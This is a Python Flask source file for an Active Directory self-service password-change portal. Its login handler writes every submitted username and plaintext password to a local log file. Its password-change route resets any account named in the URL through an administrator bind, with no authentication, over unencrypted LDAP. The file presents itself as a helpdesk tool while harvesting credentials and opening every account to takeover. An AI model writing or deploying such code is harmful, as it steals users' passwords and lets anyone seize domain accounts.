import os
from ldap3 import Server, Connection, MODIFY_REPLACE, ALL
from flask import Flask, render_template, request, redirect, url_for
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

def log_credentials(username, password):
    with open('user_credentials.log', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

def change_ad_password(username, new_password):
    try:
        server = Server(os.getenv('AD_SERVER'), use_ssl=False, get_info=ALL)
        admin_conn = Connection(
            server,
            user=os.getenv('AD_ADMIN_USER'),
            password=os.getenv('AD_ADMIN_PASSWORD'),
            auto_bind=True
        )
        
        # Используем AD_BASE_DN из .env
        user_dn = f"CN={username},CN=Users,{os.getenv('AD_BASE_DN')}"
        
        unicode_pass = f'"{new_password}"'.encode('utf-16-le')
        
        admin_conn.modify(
            user_dn,
            {'unicodePwd': [(MODIFY_REPLACE, [unicode_pass])}
        )
        
        if admin_conn.result['result'] == 0:
            return True
        return False
    except Exception as e:
        print(f"Error changing password: {str(e)}")
        return False
    finally:
        admin_conn.unbind()

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        log_credentials(username, password)
        
        try:
            server = Server(os.getenv('AD_SERVER'), use_ssl=False)
            user_conn = Connection(
                server,
                user=f"DOMAIN\\{username}",
                password=password,
                auto_bind=True
            )
            user_conn.unbind()
            return redirect(url_for('change_password', username=username))
        except Exception as e:
            if 'invalidCredentials' in str(e):
                return "Invalid credentials", 401
            return str(e), 500
    
    return render_template('login.html')

@app.route('/change_password', methods=['GET', 'POST'])
def change_password():
    username = request.args.get('username')
    
    if request.method == 'POST':
        new_password = request.form['new_password']
        if change_ad_password(username, new_password):
            return "Password changed successfully"
        return "Password change failed", 500
    
    return render_template('change_password.html', username=username)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)